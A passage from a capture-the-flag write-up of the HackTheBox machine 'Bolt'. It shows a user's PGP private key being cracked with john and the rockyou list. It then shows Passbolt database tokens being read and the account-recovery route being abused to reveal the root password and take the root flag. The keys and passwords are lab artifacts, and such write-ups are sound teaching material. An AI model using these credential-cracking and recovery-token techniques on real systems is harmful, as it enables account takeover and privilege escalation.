eccJwQkwI9SFtaDQQQLI0b3F6wV32fE\\r\\n21nq2dek7/hocGpoxIYwOJRkpkw9tK2g8betT4OjHmVkiPnoyWo9do8g0Bzd\\r\\nNBUlP7GHXM/t605MdK9ZMQARAQABwsENBBgBCgAgFiEEWYYKJp6AP6CUQWdT\\r\\nq44u+1ahbIQFAmA2peUCGwwAIQkQq44u+1ahbIQWIQRZhgomnoA/oJRBZ1Or\\r\\nji77VqFshCbkC/9mKoWGFEGCbgdMX3+yiEKHscumFvmd1BABdc+BLZ8RS2D4\\r\\ndvShUdw+gf3m0Y9O16oQ/a2kDQywWDBC9kp3ByuRsphu7WnvVSh5PM0quwCK\\r\\nHmO+DwPJyw7Ji+ESRRCyPIIZImZrPYyBsJtmVVpjq323yEuWBB1l5NyflL5I\\r\\nLs9kncyEc7wNb5p1PEsui/Xv7N5HRocp1ni1w5k66BjKwMGnc48+x1nGPaP0\\r\\n4LYAjomyQpRLxFucKtx8UTa26bWWe59BSMGjND8cGdi3FiWBPmaSzp4+E1r0\\r\\nAJ2SHGJEZJXIeyASrWbvXMByxrVGgXBR6NHfl5e9rGDZcwo0R8LbbuACf7/F\\r\\nsRIKSwmIaLpmsTgEW9d8FdjM6Enm7nCObJnQOpzzGbHbIMxySaCso/eZDX3D\\r\\nR50E9IFLqf+Au+2UTUhlloPnIEcp7xV75txkLm6YUAhMUyLn51pGsQloUZ6L\\r\\nZ8gbvveCudfCIYF8cZzZbCB3vlVkPOBSl6GwOg9FHAVS0jY=\\r\\n=FBUR\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"56a16c84\",\"userIds\":[{\"name\":\"Passbolt Server Key\",\"email\":\"admin@bolt.htb\"}],\"fingerprint\":\"59860a269e803fa094416753ab8e2efb56a16c84\",\"created\":\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":3072,\"private\":false,\"user_id\":\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\"},\"4e184ee6-e436-47fb-91c9-dccb57f250bc\":{\"key\":\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\r\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\r\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\r\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\r\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\r\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\r\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\r\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\r\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\r\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\r\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\r\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\r\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\r\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\r\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\r\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\r\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\r\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\r\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\r\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\r\\ntD0sGGFpQMsI+Q==\\r\\n=+pbw\\r\\n-----END PGP PUBLIC KEY BLOCK-----\\r\\n\",\"keyId\":\"dc3b4abd\",\"userIds\":[{\"name\":\"Eddie Johnson\",\"email\":\"eddie@bolt.htb\"}],\"fingerprint\":\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\",\"created\":\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\",\"expires\":\"Never\",\"algorithm\":\"rsa_encrypt_sign\",\"length\":2048,\"private\":false,\"user_id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\"}}"}
...

```

We can get the PRIVATE key:
```console
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW
UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua
jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA
iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac
2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj
QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf
DRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/
7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2
AZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49
tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc
Uct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP
yF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj
XTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e
IHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp
eqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM
vjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp
ZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ
AQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H
/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF
nyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba
qx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt
zc5gVIg7esI2dnTkNnFWoFZ3+j8hzFmS6lJvJ0GN+Nrd/gAOkhU8P2KcDz74
7WQQR3/eQa0m6QhOQY2q/VMgfteMejlHFoZCbu0IMkqwsAINmiiAc7H1qL3F
U3vUZKav7ctbWDpJU/ZJ++Q/bbQxeFPPkM+tZEyAn/fHwwYEYDgbYQEIAJpY
HMNw6lcxAWuZPXYz7FEyVjilWObqMaAael9B/Z40fVH29l7ZsWVFHVf7obW5
zNJUpTZHjTQV+HP0J8vPL35IG+usXKDqOKvnzQhGXwpnEtgMDLFJc2jw0I6M
KeFfplknPCV6uBlznf5q6KIm7YhHbbyuKczHb8BgspBaroMkQy5LHNYXw2FP
rOUeNkzYjHVuzsGAKZZzo4BMTh/H9ZV1ZKm7KuaeeE2x3vtEnZXx+aSX+Bn8
Ko+nUJZEn9wzHhJwcsRGV94pnihqwlJsCzeDRzHlLORF7i57n7rfWkzIW8P7
XrU7VF0xxZP83OxIWQ0dXd5pA1fN3LRFIegbhJcAEQEAAf4JAwizGF9kkXhP
leD/IYg69kTvFfuw7JHkqkQF3cBf3zoSykZzrWNW6Kx2CxFowDd/a3yB4moU
KP9sBvplPPBrSAQmqukQoH1iGmqWhGAckSS/WpaPSEOG3K5lcpt5EneFC64f
a6yNKT1Z649ihWOv+vpOEftJVjOvruyblhl5QMNUPnvGADHdjZ9SRmo+su67
JAKMm0cf1opW9x+CMMbZpK9m3QMyXtKyEkYP5w3EDMYdM83vExb0DvbUEVFH
kERD10SVfII2e43HFgU+wXwYR6cDSNaNFdwbybXQ0quQuUQtUwOH7t/Kz99+
Ja9e91nDa3oLabiqWqKnGPg+ky0oEbTKDQZ7Uy66tugaH3H7tEUXUbizA6cT
Gh4htPq0vh6EJGCPtnyntBdSryYPuwuLI5WrOKT+0eUWkMA5NzJwHbJMVAlB
GquB8QmrJA2QST4v+/xnMLFpKWtPVifHxV4zgaUF1CAQ67OpfK/YSW+nqong
cVwHHy2W6hVdr1U+fXq9XsGkPwoIJiRUC5DnCg1bYJobSJUxqXvRm+3Z1wXO
n0LJKVoiPuZr/C0gDkek/i+p864FeN6oHNxLVLffrhr77f2aMQ4hnSsJYzuz
4sOO1YdK7/88KWj2QwlgDoRhj26sqD8GA/PtvN0lvInYT93YRqa2e9o7gInT
4JoYntujlyG2oZPLZ7tafbSEK4WRHx3YQswkZeEyLAnSP6R2Lo2jptleIV8h
J6V/kusDdyek7yhT1dXVkZZQSeCUUcQXO4ocMQDcj6kDLW58tV/WQKJ3duRt
1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS
UCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU
Nsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf
QmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm
oRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg
6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/
Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

Let's crack the passphrase of this private key using ```john```:
```console
┌─[evyatar@parrot]─[/hackthebox/Bolt]
└──╼ $ gpg2john key.key > keyhash

File key.key
┌─[evyatar@parrot]─[/hackthebox/Bolt]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt keyhash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)
1g 0:00:12:13 DONE (2021-10-03 00:19) 0.001364g/s 58.44p/s 58.44c/s 58.44C/s mhiedhie..memoteamo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So we found the passphrase is ```merrychristmas```.

From here, We have two methods to get the root password.

***Method 1***

By enumerating on ```/etc/passbolt``` (as ```www-data```) we found few intresting files.

The first file is ```/etc/passbolt/routes.php```:
```php
...
/**
 * Setup routes
 */
Router::scope('/setup', function ($routes) {
    $routes->setExtensions(['json']);

    // new routes
    $routes->connect('/start/:userId/:tokenId', ['prefix' => 'Setup', 'controller' => 'SetupStart', 'action' => 'start'])
        ->setPass(['userId', 'tokenId'])
        ->setMethods(['GET']);

    $routes->connect('/complete/:userId', ['prefix' => 'Setup', 'controller' => 'SetupComplete', 'action' => 'complete'])
        ->setPass(['userId'])
        ->setMethods(['PUT', 'POST']);

    $routes->connect('/recover/start/:userId/:tokenId', ['prefix' => 'Setup', 'controller' => 'RecoverStart', 'action' => 'start'])
        ->setPass(['userId', 'tokenId'])
        ->setMethods(['GET']);

    $routes->connect('/recover/complete/:userId', ['prefix' => 'Setup', 'controller' => 'RecoverComplete', 'action' => 'complete'])
        ->setPass(['userId'])
        ->setMethods(['PUT', 'POST']);

    // Legacy v1 backward compatibility routes
    $routes->connect('/install/:userId/:tokenId', ['prefix' => 'Setup', 'controller' => 'SetupStart', 'action' => 'start'])
        ->setPass(['userId', 'tokenId'])
        ->setMethods(['GET']);

    $routes->connect('/recover/:userId/:tokenId', ['prefix' => 'Setup', 'controller' => 'RecoverStart', 'action' => 'start'])
        ->setPass(['userId', 'tokenId'])
        ->setMethods(['GET']);

    $routes->connect('/completeRecovery/:userId', ['prefix' => 'Setup', 'controller' => 'RecoverComplete', 'action' => 'complete'])
        ->setPass(['userId'])
        ->setMethods(['PUT', 'POST']);
});

...
```

The intresting part is:
```php
$routes->connect('/recover/:userId/:tokenId', ['prefix' => 'Setup', 'controller' => 'RecoverStart', 'action' => 'start'])
    ->setPass(['userId', 'tokenId'])
    ->setMethods(['GET']);
```

When we are trying to recover account (from [https://passbolt.bolt.htb](https://passbolt.bolt.htb)):

![recover.JPG](images/recover.JPG)

Clicking on next:

![recoveremail.JPG](images/recoveremail.JPG)

We can navigate to the route [https://passbolt.bolt.htb/setup/recover/:userId/:tokenId](https://passbolt.bolt.htb/setup/recover/:userId/:tokenId).

We can get the user id and token id from passbolt database (credentials from ```/etc/passbolt/passbolt.php``` file):
```console
eddie@bolt:$ mysql -u passbolt -p${p} -e "use passboltdb; select * from users"
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| id                                   | role_id                              | username       | active | deleted | created             | modified            |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb |      1 |       0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 |
| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb |      1 |       0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 |
+--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+
eddie@bolt:/tmp$ mysql -u passbolt -p${p} -e "use passboltdb; select * from authentication_tokens;"
mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------------------------------+--------------------------------------+--------------------------------------+--------+---------------------+---------------------+----------+------+
| id                                   | token                                | user_id                              | active | created             | modified            | type     | data |
+--------------------------------------+--------------------------------------+--------------------------------------+--------+---------------------+---------------------+----------+------+
| 015b22eb-694f-4c94-a97d-0c87d69017ed | a7b19b6b-9f7f-482b-b677-b284ad5d6a29 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      0 | 2021-02-25 22:31:57 | 2021-02-25 22:31:58 | login    | NULL |
| 0e00a95e-5d29-4867-9ef7-0e87a0d13833 | 3ff489bb-6216-4642-bb4a-7b5a7600c8d3 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      1 | 2021-10-02 20:27:47 | 2021-10-02 20:27:47 | recover  | NULL |
| 33bb7368-2f0e-4ef1-a35c-0793c8837b84 | 730635fd-c075-447b-91a6-56b25621b504 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      1 | 2021-10-02 19:05:36 | 2021-10-02 19:05:36 | recover  | NULL |
| 415f74dd-7e94-4799-8ee5-2f88ec0d72c6 | f4509818-b9f7-41a0-9804-0e0e0362eff0 | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff91 |      1 | 2021-10-02 19:26:46 | 2021-10-02 19:26:46 | recover  | NULL |
| 463f2e84-1f36-4e2f-ac0d-0010b96edee3 | f861c953-aac8-4902-88da-5d17aca0ffde | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 |      0 | 2021-02-25 21:41:46 | 2021-02-25 21:41:47 | login    | NULL |
| 57bb11fb-01e5-413c-9442-1d9bc480dbfb | cb900e0b-c602-4da7-acb6-f1daec248836 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      0 | 2021-02-25 21:49:38 | 2021-02-25 21:49:39 | login    | NULL |
| 5bb9d763-c95c-4986-9119-542133e3279c | 5779bcad-2c17-487c-bf01-8168a3b20393 | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 |      0 | 2021-02-25 21:40:29 | 2021-02-25 21:41:14 | register | NULL |
| a0c009af-df45-4587-b52c-c1c6e0873106 | bca78c99-4a08-488c-a308-2695c4643c36 | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff91 |      1 | 2021-10-02 19:22:14 | 2021-10-02 19:22:14 | recover  | NULL |
| ac1f4319-f9da-4cfd-95e4-ddc58b180694 | 25083f5f-fa10-4f78-9ac8-53246cc030c4 | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 |      1 | 2021-10-02 19:07:05 | 2021-10-02 19:07:05 | recover  | NULL |
| b1f9eda8-986c-4cfd-9afd-d0f7d9734554 | d59321ea-ea62-4fc8-b990-0385f19f7238 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      0 | 2021-10-02 21:48:59 | 2021-10-02 21:48:59 | login    | NULL |
| c54ef2f0-0ebf-42fe-90a5-e08d97631bcd | c88de57f-e27a-469f-9d87-519db7c7a2d7 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      0 | 2021-10-02 21:47:52 | 2021-10-02 21:48:58 | recover  | NULL |
| e60cb0de-eaad-406a-aea3-a39c2abeee5a | 1e58d500-57ec-4d45-83ac-46186ff769e2 | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      1 | 2021-10-02 22:01:16 | 2021-10-02 22:01:16 | recover  | NULL |
| feb08771-2e55-43d8-92bc-d4a34d403273 | 8c7d2952-1598-420d-a666-fdece8f02bfc | 4e184ee6-e436-47fb-91c9-dccb57f250bc |      0 | 2021-02-25 21:42:50 | 2021-02-25 21:49:38 | register | NULL |
+--------------------------------------+--------------------------------------+--------------------------------------+--------+---------------------+---------------------+----------+------+

```

Let's get the token of ```eddie@bolt.htb``` which is ```1e58d500-57ec-4d45-83ac-46186ff769e2```, The user id of ```eddie@bolt.htb``` is ```4e184ee6-e436-47fb-91c9-dccb57f250bc```.

Now let's build the URL:  [https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/1e58d500-57ec-4d45-83ac-46186ff769e2](https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/1e58d500-57ec-4d45-83ac-46186ff769e2).

By browsing to this URL we get:

![recoverprivate.JPG](images/recoverprivate.JPG)

We can insert the PGP private key we just found before, Clicking on Next:

![recoverpasspharse.JPG](images/recoverpasspharse.JPG)

Clicking on Verify and we get some security token:

![recoversecurity.JPG](images/recoversecurity.JPG)

Clicking on Next and we get the passbolt portal:

![passboltportal.JPG](images/passboltportal.JPG)

If we are clicking on the button to unhide the root password as asked again to enter the passphrase:

![passboltunhide.JPG](images/passboltunhide.JPG)

Enter the passphrase and we get the root password:

![passboltroot.JPG](images/passboltroot.JPG)

The root password is ```Z(2rmxsNW(Z?3=p/9s```, Let's use it:
```console
eddie@bolt:~$ su root
Password: 
root@bolt:/home/eddie# whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root)
bolt.htb
root@bolt:/home/eddie# cat /root/root.txt
03cf0eb1cb9c267473f132c0a06f2ca2
```

And we get the root flag ```03cf0eb1cb9c267473f132c0a06f2ca2```.


***Method 2***

Reading data from ```email_queue``` on ```passboltdb```:
```console
eddie@bolt:~$ mysql -u passbolt -p${p} -e "use passboltdb; select * from email_queue"
...
| 13 | eddie@bolt.htb | NULL      | NULL       | Eddie edited the password passbolt.bolt.htb    | default | LU/resource_update     | default |       | html   | a:3:{s:4:"body";a:7:{s:4:"user";O:21:"App\Model\Entity\User":10:{s:11:" * _virtual";a:1:{i:0;s:14:"last_logged_in";}s:14:" * _accessible";a:6:{s:2:"id";b:0;s:8:"username";b:0;s:6:"active";b:0;s:7:"deleted";b:0;s:7:"role_id";b:0;s:7:"profile";b:0;}s:10:" * _fields";a:9:{s:2:"id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:7:"role_id";s:36:"1cfcd300-0664-407e-85e6-c11664a7d86c";s:8:"username";s:14:"eddie@bolt.htb";s:6:"active";b:1;s:7:"deleted";b:0;s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:42:50.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:4:"role";O:21:"App\Model\Entity\Role":10:{s:14:" * _accessible";a:2:{s:1:"*";b:1;s:2:"id";b:0;}s:10:" * _fields";a:5:{s:2:"id";s:36:"1cfcd300-0664-407e-85e6-c11664a7d86c";s:4:"name";s:4:"user";s:11:"description";s:14:"Logged in user";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2012-07-04 13:39:25.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2012-07-04 13:39:25.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:5:"Roles";}s:7:"profile";O:24:"App\Model\Entity\Profile":10:{s:14:" * _accessible";a:4:{s:2:"id";b:0;s:7:"user_id";b:0;s:10:"first_name";b:0;s:9:"last_name";b:0;}s:10:" * _fields";a:7:{s:2:"id";s:36:"13d7b7c4-917e-48ee-9560-f022c89b2895";s:7:"user_id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:10:"first_name";s:5:"Eddie";s:9:"last_name";s:7:"Johnson";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:42:50.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:55:06.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:6:"avatar";O:23:"App\Model\Entity\Avatar":10:{s:11:" * _virtual";a:1:{i:0;s:3:"url";}s:14:" * _accessible";a:1:{s:1:"*";b:1;}s:10:" * _fields";a:5:{s:2:"id";s:36:"42c3796f-5561-47d9-9425-ce1e7d5d2005";s:4:"data";i:0;s:10:"profile_id";s:36:"13d7b7c4-917e-48ee-9560-f022c89b2895";s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-09-09 16:28:55.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-09-09 16:28:55.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:7:"Avatars";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:11:" * _virtual";a:0:{}s:9:" * _dirty";a:1:{s:6:"avatar";b:1;}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:8:"Profiles";}}s:12:" * _original";a:0:{}s:10:" * _hidden";a:0:{}s:9:" * _dirty";a:0:{}s:7:" * _new";b:0;s:10:" * _errors";a:0:{}s:11:" * _invalid";a:0:{}s:17:" * _registryAlias";s:5:"Users";}s:8:"resource";O:25:"App\Model\Entity\Resource":10:{s:14:" * _accessible";a:15:{s:4:"name";b:1;s:8:"username";b:1;s:3:"uri";b:1;s:11:"description";b:1;s:7:"deleted";b:0;s:7:"created";b:0;s:8:"modified";b:1;s:10:"created_by";b:0;s:11:"modified_by";b:1;s:7:"creator";b:0;s:8:"modifier";b:0;s:10:"permission";b:0;s:11:"permissions";b:0;s:7:"secrets";b:0;s:16:"resource_type_id";b:1;}s:10:" * _fields";a:12:{s:2:"id";s:36:"cd0270db-c83f-4f44-b7ac-76609b397746";s:4:"name";s:17:"passbolt.bolt.htb";s:8:"username";s:4:"root";s:3:"uri";s:0:"";s:11:"description";s:0:"";s:7:"deleted";b:0;s:7:"created";O:20:"Cake\I18n\FrozenTime":3:{s:4:"date";s:26:"2021-02-25 21:50:11.000000";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:8:"modified";O:14:"Cake\I18n\Time":3:{s:4:"date";s:26:"2021-10-02 21:52:54.173057";s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}s:10:"created_by";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:11:"modified_by";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:16:"resource_type_id";s:36:"a28a04cd-6f53-518a-967c-9963bf9cec51";s:7:"secrets";a:1:{i:0;O:23:"App\Model\Entity\Secret":10:{s:14:" * _accessible";a:5:{s:7:"user_id";b:0;s:11:"resource_id";b:0;s:4:"data";b:0;s:7:"created";b:0;s:8:"modified";b:0;}s:10:" * _fields";a:6:{s:2:"id";s:36:"643a8b12-c42c-4507-8646-2f8712af88f8";s:7:"user_id";s:36:"4e184ee6-e436-47fb-91c9-dccb57f250bc";s:11:"resource_id";s:36:"cd0270db-c83f-4f44-b7ac-76609b397746";s:4:"data";s:1098:"-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQf/UGf6kAGXa6nm9toGx1cQBYVr2fidgiLmYSO7+XhK
NWgw4+N1R3eIra+JCEAxq2LiO7Qvr2nu1OJXoqM9+N379M7AqAsKfNdlpt36
cF+7EKVy90z72S3qzEbKYWC1Ry01j39aeRGw3XLSB3Zf67RQY1V8y80lo4tz
dpS5z+c4j5v+IgIe0WLHtsyev5bmmjp56vWDnjh43w+7TmwcSs8wxa5EbZSE
